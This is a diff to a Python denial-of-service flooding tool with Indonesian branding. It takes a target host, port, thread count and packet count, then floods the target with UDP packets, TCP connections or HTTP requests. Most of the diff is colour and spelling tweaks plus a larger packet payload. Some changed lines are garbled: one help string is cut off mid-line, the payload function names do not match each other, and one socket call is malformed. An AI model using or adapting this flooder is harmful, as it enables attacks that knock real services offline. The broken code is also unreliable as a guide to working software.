@@ -4,7 +4,7 @@ if __name__=='__main__':
         parser=ArgumentParser()
         parser.add_argument('METHOD',help='The method to be used',nargs='?')
         parser.add_argument('TARGET',help='Target host',nargs='?')
-        parser.add_argument('PORT',help='Target port',nargs='?')
+        parser.add_argument('PORT',help='Target
         parser.add_argument('THREADS',help='Number of threads',nargs='?')
         parser.add_argument('COUNT',help='Number of packets that can be sent',nargs='?')
         parser.add_argument('NOANSI',help='If the colors have an error, the value in this argument must be True',nargs='?')
@@ -43,16 +43,16 @@ Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
         METHODS=['BIGENIONS','CONNECTS','CONNECTS2','BOTS','URL']
         print(RESET+" Checking the method...")
         if not METHOD in METHODS:
-            print(RED+"Methode Tidak Di Termukan. There is available methods to use: "+", ".join([i for i in METHODS]))
+            print(RED+"Methode Tidak Di Temukan. There is available methods to use: "+", ".join([i for i in METHODS]))
             exit()
         if args.TARGET:TARGET=str(args.TARGET)
-        else:TARGET=input(RESET+f'[{RED}Enter the target host (IP/URL){RESET}]: {RED}')
+        else:TARGET=input(RESET+f'[{RED}Enter the target host (IP/URL){RESET}]: {YELLOW}')
         if args.PORT:PORT=str(args.PORT)
-        else:PORT=input(RESET+f'[{RED}Enter the port targets (PORT){RESET}]: {RED}')
+        else:PORT=input(RESET+f'[{RED}Enter the port targets (PORT){RESET}]: {YELLOW}')
         if args.THREADS:THREADS=int(args.THREADS)
-        else:THREADS=int(input(RESET+f'[{CYAN}Enter The Number Threads{RESET}]: {CYAN}'))
+        else:THREADS=int(input(RESET+f'[{CYAN}Enter The Number Threads{RESET}]: {YELLOW}'))
         if args.COUNT:COUNT=int(args.COUNT)
-        else:COUNT=int(input(RESET+f'[{CYAN}Enter The Number Packets{RESET}]: {CYAN}'))
+        else:COUNT=int(input(RESET+f'[{CYAN}Enter The Number Packets{RESET}]: {YELLOW}'))
         print(RESET+" Importing something...")
         from threading import Thread
         if METHOD in ['BIGENIONS','CONNECTS','CONNECTS2','BOTS']:from socket import socket,AF_INET
@@ -71,7 +71,7 @@ Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
         def __thread__():
             for x in range(COUNT):
                 try:
-                    if METHOD=="BIGENIONS":sock.sendto(K_ibytes(557),(IP,PORT))
+                    if METHOD=="BIGENIONS":sock.sendto(K_immetests(550055),(IP,PORT))
                     elif METHOD=="CONNECTS":socket(AF_INET,SOCK_STREAM,SOCK_DGRAM).connect((IP,PORT))
                     elif METHOD=="CONNECTS2":
                         sock=socket(AF_INET,SOCK_STREAM,SOCK_DGRAM)
@@ -80,7 +80,7 @@ Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
                     elif METHOD=="BOTS":
                         sock=socket(AF_INET,SOCK_STREAM)
                         sock.connect((IP,PORT))
-                        sock.sendto(K_ibytes(557))
+                        sock.sendto(K_immetest(550055))
                     elif METHOD=="URL":urlopen(Request(TARGET,headers=ua.Random()))
                 except TimeoutError:pass
                 except ConnectionRefusedError as e:
